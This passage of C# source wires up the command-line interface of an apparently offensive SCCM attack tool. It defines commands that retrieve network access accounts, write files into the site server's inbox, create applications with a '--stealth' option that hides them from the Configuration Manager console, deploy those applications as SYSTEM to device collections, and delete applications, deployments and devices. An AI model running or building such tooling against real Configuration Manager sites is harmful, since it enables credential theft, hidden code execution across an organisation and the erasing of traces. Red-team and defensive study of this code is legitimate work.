                    System.IO.File.WriteAllLines("C:\\Program Files\\Microsoft Configuration Manager\\inboxes\\ccr.box\\test.ccr", lines);
                });

            // local push-logs
            var localPushLogs = new Command("push-logs", "Search for evidence of client push installation");
            localCommand.Add(localPushLogs);
            localPushLogs.Handler = CommandHandler.Create(
                new Action(() =>
                {
                    //LocalPushLogs();
                }));

            // local grep
            var localGrep = new Command("grep", "Search a specified file for a specified string");
            localCommand.Add(localGrep);
            localGrep.Add(new Argument<string>("path", "The full path to the file (e.g., \"C:\\Windows\\ccmsetup\\Logs\\ccmsetup.log"));
            localGrep.Add(new Argument<string>("string-to-find", "The string to search for"));
            localGrep.Handler = CommandHandler.Create(
                (string path, string stringToFind) =>
                    LocalGrepFile(path, stringToFind)
                );

            // local naa
            var getLocalNetworkAccessAccounts = new Command("naa", "Get any network access accounts for the site");
            localCommand.Add(getLocalNetworkAccessAccounts);
            getLocalNetworkAccessAccounts.Handler = CommandHandler.Create(
                new Action(() =>
                {
                    LocalNetworkAccessAccounts();
                }));

            // local siteinfo
            var localSiteInfo = new Command("siteinfo", "Get the primary Management Point and Site Code for the local host");
            localCommand.Add(localSiteInfo);
            localSiteInfo.Handler = CommandHandler.Create(
                new Action(() =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
                    GetClassInstances(sccmConnection, "SMS_Authority", false, new[] { "CurrentManagementPoint", "Name" });
                }));

            // local classes
            var localClasses = new Command("classes", "Get information on local WMI classes");
            localCommand.Add(localClasses);
            localClasses.Add(new Argument<string>("wmiPath", "The WMI path to query (e.g., \"root\\ccm\")"));
            localClasses.Handler = CommandHandler.Create(
                (string wmiPath, bool count, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\" + wmiPath);
                    GetClasses(sccmConnection);
                });

            // new
            var newCommand = new Command("new", "A group of commands that create new objects on the server");
            rootCommand.Add(newCommand);

            // new application
            var newApplication = new Command("application", "Create an application");
            newCommand.Add(newApplication);
            newApplication.Add(new Argument<string>("name", "The name you would like your application to be called"));
            newApplication.Add(new Argument<string>("path", "The local or UNC path of the binary/script the application will execute (e.g., \"C:\\Windows\\System32\\calc.exe\", \"\\\\site-server.domain.com\\Sources$\\my.exe"));
            newApplication.Add(new Option<bool>(new[] { "--run-as-user", "-r" }, "Run the application in the context of the logged on user (default: SYSTEM)"));
            newApplication.Add(new Option<bool>(new[] { "--stealth", "-s" }, "Hide the application from the Configuration Manager console"));
            newApplication.Handler = CommandHandler.Create(
                (string server, string sitecode, string name, string path, bool runAsUser, bool stealth) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    NewApplication(sccmConnection, name, path, runAsUser, stealth);
                });

            // new collection
            var newCollection = new Command("collection", "Create a collection of devices or users");
            newCommand.Add(newCollection);
            // newCollection.Add(new Argument<string>("collection-type", "The type of collection to create, 'device' or 'user'").FromAmong(new string[] { "device", "user" }));
            newCollection.Add(new Argument<string>("collection-type", "The type of collection to create, 'device' or 'user'"));
            newCollection.Add(new Argument<string>("collection-name", "The name you would like your collection to be called"));
            newCollection.Handler = CommandHandler.Create(
                (string server, string sitecode, string collectionType, string collectionName) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    NewCollection(sccmConnection, collectionType, collectionName);
                });

            // new deployment
            var newDeployment = new Command("deployment", "Create an assignment to deploy an application to a collection");
            newCommand.Add(newDeployment);
            newDeployment.Add(new Argument<string>("application", "The name of the application you would like to deploy"));
            newDeployment.Add(new Argument<string>("collection", "The name of the collection you would like to deploy the application to"));
            newDeployment.Handler = CommandHandler.Create(
                (string server, string sitecode, string name, string application, string collection) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    NewDeployment(sccmConnection, application, collection);
                });

            // remove
            var removeCommand = new Command("remove", "A group of commands that deletes objects from the server");
            rootCommand.Add(removeCommand);

            // remove application
            var removeApplication = new Command("application", "Delete a specified application");
            removeCommand.Add(removeApplication);
            removeApplication.Add(new Argument<string>("name", "The exact name (LocalizedDisplayName) of the application to delete"));
            removeApplication.Handler = CommandHandler.Create(
                (string server, string sitecode, string name) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    RemoveApplication(sccmConnection, name);
                });

            // remove collection
            var removeCollection = new Command("collection", "Delete a specified collection");
            removeCommand.Add(removeCollection);
            removeCollection.Add(new Argument<string>("name", "The exact name (Name) of the collection to delete. All collections with this exact name will be deleted."));
            removeCollection.Handler = CommandHandler.Create(
                (string server, string sitecode, string name) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    RemoveCollection(sccmConnection, name);
                });

            // remove deployment
            var removeDeployment = new Command("deployment", "Delete a deployment of a specified application to a specified collection");
            removeCommand.Add(removeDeployment);
            removeDeployment.Add(new Argument<string>("application", "The exact name (ApplicationName) of the application deployed"));
            removeDeployment.Add(new Argument<string>("collection", "The exact name (CollectionName) of the collection the application was deployed to"));
            removeDeployment.Handler = CommandHandler.Create(
                (string server, string sitecode, string application, string collection) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    RemoveDeployment(sccmConnection, application, collection);
                });

            // remove device
            var removeDevice = new Command("device", "Remove a device from SCCM");
            removeCommand.Add(removeDevice);
            removeDevice.Add(new Argument<string>("guid", "The GUID of the device to remove (e.g., \"GUID:AB424B0D-F582-4020-AA26-71D32EA07683\""));
            removeDevice.Handler = CommandHandler.Create(
                (string server, string sitecode, string guid) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    RemoveDevice(sccmConnection, guid);
                });

            // Execute
            var commandLine = new CommandLineBuilder(rootCommand).UseDefaults().Build();
            commandLine.Invoke(args);
        }


    }
}